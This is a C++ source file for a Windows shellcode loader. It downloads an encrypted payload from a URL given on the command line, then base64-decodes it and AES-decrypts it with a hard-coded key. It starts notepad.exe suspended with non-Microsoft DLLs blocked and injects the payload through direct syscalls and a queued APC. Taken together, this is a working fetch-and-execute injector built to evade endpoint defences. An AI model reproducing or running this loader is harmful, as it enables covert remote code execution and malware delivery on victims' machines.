
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <cstdint>
#include <iostream>
#include "aes.h"
#include <ntstatus.h>
#include "syscalls_all.h"

/*
#include <fstream>
#include <string>
#include <cstddef>
#include <string>

#include "base64.h"
*/

#define BUFFER_SIZE 1024

#pragma comment (lib, "Wininet.lib")


static const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const LPSTR MASK_PROCESS = (LPSTR)"C:\\windows\\system32\\notepad.exe";
const char* key = "AAAAAAAAAAAAAAAA";
const char* iv = "AAAAAAAAAAAAAAAA";


struct Shellcode {
	byte* data;
	DWORD len;
};

Shellcode Download(LPCWSTR host, INTERNET_PORT port, LPCWSTR path);
VOID Base64Decode(Shellcode* input);
int writeDataToFile(const char* filename, const Shellcode* data);
void Decrypt(Shellcode data, const char* key, const char* iv);
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);

int main()
{
    
	LPCWSTR commandLine = GetCommandLineW(); // Get the command line as LPCWSTR
	int argc;
	LPWSTR* argv = CommandLineToArgvW(commandLine, &argc);
	LPCWSTR url = argv[1];
	Shellcode result;

	GetPayloadFromUrl(url, (PBYTE*)&result.data, (SIZE_T*)&result.len);
	Base64Decode(&result);
	Decrypt(result, key, iv);
	
	NTSTATUS status;
	LPVOID allocation_start;

	PROCESS_INFORMATION pi = {};
	STARTUPINFOEXA si = {};
	SIZE_T attributeSize = 0;
	SIZE_T allocation_size = (SIZE_T)result.len;

	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);

	PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);

	InitializeProcThreadAttributeList(attributes, 1, 0, &attributeSize);

	DWORD policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
	
	si.lpAttributeList = attributes;

	if (!CreateProcessA(MASK_PROCESS, NULL, NULL, NULL, EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
		printf("You fucked up!");
	}

	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, attributes);

	allocation_start = VirtualAllocExNuma(pi.hProcess, NULL, result.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);
	status = NtWriteVirtualMemory(pi.hProcess, allocation_start, result.data, allocation_size, nullptr);

	if (status != STATUS_SUCCESS) {
		printf("You fucked up!!");
	}

	DWORD oldProtect;
	status = NtProtectVirtualMemory(pi.hProcess, &allocation_start, &allocation_size, PAGE_EXECUTE_READ, &oldProtect);

	if (status != STATUS_SUCCESS) {
		printf("You fucked up!!!");
	}

	NtQueueApcThread(pi.hThread, (PKNORMAL_ROUTINE)allocation_start, NULL, NULL, NULL);
	NtResumeThread(pi.hThread, 0);

    return 0;
}


void Decrypt(Shellcode data, const char* key, const char* iv) {
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, (uint8_t*)key, (uint8_t*)iv);
	AES_CBC_decrypt_buffer(&ctx, data.data, data.len);
}

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL;
	PBYTE		pBytes = NULL,
		pTmpBytes = NULL;



	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}



	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}

Shellcode Download(LPCWSTR host, INTERNET_PORT port, LPCWSTR path) {
	HINTERNET session = InternetOpen(
		L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET connection = InternetConnect(
		session,
		host,
		port,
		L"",
		L"",
		INTERNET_SERVICE_HTTP,
		0,
		0);

	HINTERNET request = HttpOpenRequest(
		connection,
		L"GET",
		path,
		NULL,
		NULL,
		NULL,
		0,
		0);

	WORD counter = 0;
	while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
		//printf("Error sending HTTP request: : (%lu)\n", GetLastError()); // only for debugging

		counter++;
		Sleep(3000);
		if (counter >= 3) {
			exit(0); // HTTP requests eventually failed
		}
	}

	DWORD bufSize = BUFSIZ;
	byte* buffer = new byte[bufSize];

	DWORD capacity = bufSize;
	byte* payload = (byte*)malloc(capacity);

	DWORD payloadSize = 0;

	while (true) {
		DWORD bytesRead;

		if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
			//printf("Error reading internet file : <%lu>\n", GetLastError()); // only for debugging
			exit(0);
		}

		if (bytesRead == 0) break;

		if (payloadSize + bytesRead > capacity) {
			capacity *= 2;
			byte* newPayload = (byte*)realloc(payload, capacity);
			payload = newPayload;
		}

		for (DWORD i = 0; i < bytesRead; i++) {
			payload[payloadSize++] = buffer[i];
		}

	}
	byte* newPayload = (byte*)realloc(payload, payloadSize);

	InternetCloseHandle(request);
	InternetCloseHandle(connection);
	InternetCloseHandle(session);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

	struct Shellcode out;
	out.data = payload;
	out.len = payloadSize;
	return out;
}

// Function to write content to a file


static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


int writeDataToFile(const char* filename, const Shellcode* data) {
	FILE* file = fopen(filename, "wb");
	if (file == NULL) {
		//fprintf(stderr, "Error opening file for writing\n");
		return -1;
	}

	size_t bytes_written = fwrite(data->data, sizeof(byte), data->len, file);
	fclose(file);

	if (bytes_written != data->len) {
		//fprintf(stderr, "Error writing data to file\n");
		return -1;
	}

	return 0;
}

int Base64DecodeChar(char c) {
	if (c >= 'A' && c <= 'Z') return c - 'A';
	if (c >= 'a' && c <= 'z') return c - 'a' + 26;
	if (c >= '0' && c <= '9') return c - '0' + 52;
	if (c == '+') return 62;
	if (c == '/') return 63;
	return -1; // Invalid character
}

VOID Base64Decode(Shellcode* input) {
	uint8_t* data = input->data;
	size_t length = input->len;
	size_t padding = 0;
	if (length > 0 && data[length - 1] == '=') {
		padding++;
		if (length > 1 && data[length - 2] == '=') {
			padding++;
		}
	}

	size_t outputLen = ((length * 6) >> 3) - padding;
	size_t *outputPointer = &outputLen;
	uint8_t* decodedData = (uint8_t*)malloc(outputLen + 1); // Allocate one extra byte for null terminator
	if (decodedData == NULL) {
		// Handle allocation failure
		printf("Failed to base allocate memory");
		exit(EXIT_FAILURE);
	}

	size_t i, j = 0;
	for (i = 0; i < length; i += 4) {
		uint32_t val = 0;
		for (int k = 0; k < 4; k++) {
			val <<= 6;
			if (data[i + k] != '=' && data[i+k] != '\n') {
				int decoded = Base64DecodeChar(data[i + k]);
				if (decoded == -1) {
					free(decodedData);
					Shellcode empty = { NULL, 0 };
					return; // Invalid character found
				}
				val |= decoded;
			}
		}

		decodedData[j++] = (val >> 16) & 0xFF;
		if (data[i + 2] != '=') {
			decodedData[j++] = (val >> 8) & 0xFF;
		}
		if (data[i + 3] != '=') {
			decodedData[j++] = val & 0xFF;
		}
	}

	//decodedData[j] = '\0'; // Null-terminate the string
	Shellcode output = { decodedData, outputLen };
	input->data = (byte*) decodedData;
	input->len = outputLen;
}

